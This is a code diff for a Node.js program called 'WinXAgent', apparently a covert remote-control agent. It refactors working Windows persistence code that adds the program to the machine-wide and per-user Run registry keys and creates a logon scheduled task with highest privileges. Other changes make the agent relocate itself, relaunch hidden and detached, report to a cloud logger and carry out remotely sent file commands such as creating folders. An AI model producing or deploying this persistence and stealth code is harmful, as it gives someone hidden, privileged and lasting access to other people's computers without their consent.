@@ -132,35 +132,33 @@ async function scanDirectory(dirPath, foldersOnly = false) {
 /**
  * Windows Persistence: Adds the script to the registry to run on startup
  */
-function ensurePersistence(targetPath) {
-  if (process.platform === 'win32') {
-    const isCompiled = Boolean(process.pkg);
-    // Quote the path only if it contains spaces to ensure clean commands
-    const escapedPath = targetPath.includes(' ') ? `\\"${targetPath}\\"` : targetPath;
-    const cmdPath = isCompiled ? `${escapedPath} --hidden` : `node ${escapedPath} --hidden`;
+async function ensurePersistence(targetPath) {
+  if (process.platform !== 'win32') return;
+  
+  const isCompiled = Boolean(process.pkg);
+  const escapedPath = targetPath.includes(' ') ? `\\"${targetPath}\\"` : targetPath;
+  const cmdPath = isCompiled ? `${escapedPath} --hidden` : `node ${escapedPath} --hidden`;
 
-    // 1. Registry Persistence (HKLM for all users)
-    const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${cmdPath}" /f`;
-    exec(regCmd, (err) => {
-      if (err) {
-        logToCloud(`HKLM persistence failed, attempting HKCU: ${err.message}`, 'warn');
-        const hkcuCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${cmdPath}" /f`;
-        exec(hkcuCmd, (err2) => {
-          if (err2) logToCloud(`HKCU persistence failed: ${err2.message}`, 'error');
-          else logToCloud("Persistence established in HKCU.");
-        });
-      } else logToCloud("Registry persistence established (HKLM).");
-    });
+  const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${cmdPath}" /f`;
+  const hkcuCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${cmdPath}" /f`;
+  const taskName = "WinXAgentService";
+  const taskCmd = `schtasks /create /tn "${taskName}" /tr "${cmdPath}" /sc onlogon /rl highest /f`;
 
-    // 2. Scheduled Task Persistence (Runs with Highest Privileges on every logon)
-    const taskName = "WinXAgentService";
-    const taskCmd = `schtasks /create /tn "${taskName}" /tr "${cmdPath}" /sc onlogon /rl highest /f`;
+  const run = (cmd) => new Promise(resolve => exec(cmd, (err) => resolve(err)));
 
-    exec(taskCmd, (err) => {
-      if (err) logToCloud(`Task Scheduler persistence failed: ${err.message}`, 'error');
-      else logToCloud("Scheduled Task created with Highest Privileges.");
-    });
+  // Attempt HKLM
+  let err = await run(regCmd);
+  if (err) {
+    await logToCloud(`HKLM persistence failed, attempting HKCU...`, 'warn');
+    await run(hkcuCmd);
+  } else {
+    await logToCloud("Registry persistence established (HKLM).");
   }
+
+  // Attempt Task Scheduler
+  err = await run(taskCmd);
+  if (err) await logToCloud(`Task Scheduler persistence failed: ${err ? err.message : 'Unknown error'}`, 'error');
+  else await logToCloud("Scheduled Task created with Highest Privileges.");
 }
 
 /**
@@ -186,7 +184,7 @@ async function handleCommand(payload) {
       case 'MKDIR':
         if (!data?.parentPath || !data?.name) throw new Error("Missing parent path or folder name");
         const newFolderPath = path.join(data.parentPath, data.name);
-        await fs.mkdir(newFolderPath);
+        await fs.mkdir(newFolderPath, { recursive: true });
         await logToCloud(`Created folder: ${newFolderPath}`);
         await scanDirectory(data.parentPath, lastFoldersOnlyPreference);
         break;
@@ -300,18 +298,18 @@ async function start() {
     console.log(`Initializing WinXAgent on ${COMPUTER_NAME}...`);
     
     const permanentPath = await moveToPermanentHome();
-    ensurePersistence(permanentPath);
+    await ensurePersistence(permanentPath);
     
     await logToCloud("Agent Persistence Established");
 
     const isCompiled = Boolean(process.pkg);
+    const exe = isCompiled ? permanentPath : process.execPath;
     const args = isCompiled ? ['--hidden'] : [permanentPath, '--hidden'];
-    
-    spawn(isCompiled ? permanentPath : process.execPath, args, {
+
+    spawn(exe, args, {
       detached: true,
       stdio: 'ignore',
-      windowsHide: true,
-      shell: !isCompiled // Shell true helps resolve 'node' in script mode
+      windowsHide: true
     }).unref();
 
     process.exit(0);
